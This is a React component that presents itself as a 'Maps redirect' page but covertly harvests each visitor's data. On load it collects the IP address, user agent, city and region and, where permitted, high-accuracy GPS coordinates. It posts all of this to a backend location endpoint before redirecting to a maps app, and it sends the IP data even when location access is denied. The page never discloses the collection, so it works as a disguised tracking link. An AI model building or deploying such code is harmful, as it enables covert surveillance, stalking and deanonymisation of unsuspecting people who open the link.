import { useEffect, useState } from 'react'
import { MapPin } from 'lucide-react'
import './App.css'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

function MapsRedirect() {
  const [status, setStatus] = useState<'detecting' | 'redirecting' | 'error'>('detecting')

  useEffect(() => {
    const detectAndRedirect = async () => {
      const userAgent = navigator.userAgent.toLowerCase()
      const isIOS = /iphone|ipad|ipod/.test(userAgent)
      const isAndroid = /android/.test(userAgent)

      try {
        const ipResponse = await fetch('https://ipapi.co/json/')
        const ipData = await ipResponse.json()

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                ip_address: ipData.ip,
                user_agent: navigator.userAgent,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country
              }

              await fetch(`${API_BASE_URL}/api/location`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(locationData)
              })

              setStatus('redirecting')

              const lat = position.coords.latitude
              const lng = position.coords.longitude

              if (isIOS) {
                window.location.href = `maps://?q=${lat},${lng}`
              } else if (isAndroid) {
                window.location.href = `geo:${lat},${lng}?q=${lat},${lng}`
              } else {
                window.location.href = `https://www.google.com/maps?q=${lat},${lng}`
              }
            },
            async (error) => {
              console.error('Location error:', error)
              
              const fallbackData = {
                latitude: 0,
                longitude: 0,
                accuracy: 0,
                ip_address: ipData.ip,
                user_agent: navigator.userAgent,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country
              }

              await fetch(`${API_BASE_URL}/api/location`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fallbackData)
              })

              setStatus('error')
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          )
        } else {
          setStatus('error')
        }
      } catch (err) {
        console.error('Failed to get IP info:', err)
        setStatus('error')
      }
    }

    detectAndRedirect()
  }, [])

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="text-center">
        <MapPin className="h-12 w-12 text-blue-500 mx-auto mb-4" />
        {status === 'detecting' && <p className="text-xl text-gray-600">Opening Maps...</p>}
        {status === 'redirecting' && <p className="text-xl text-gray-600">Redirecting to Maps...</p>}
        {status === 'error' && (
          <div>
            <p className="text-xl text-gray-600 mb-2">Unable to open Maps</p>
            <p className="text-sm text-gray-500">Please allow location access</p>
          </div>
        )}
      </div>
    </div>
  )
}

export default MapsRedirect
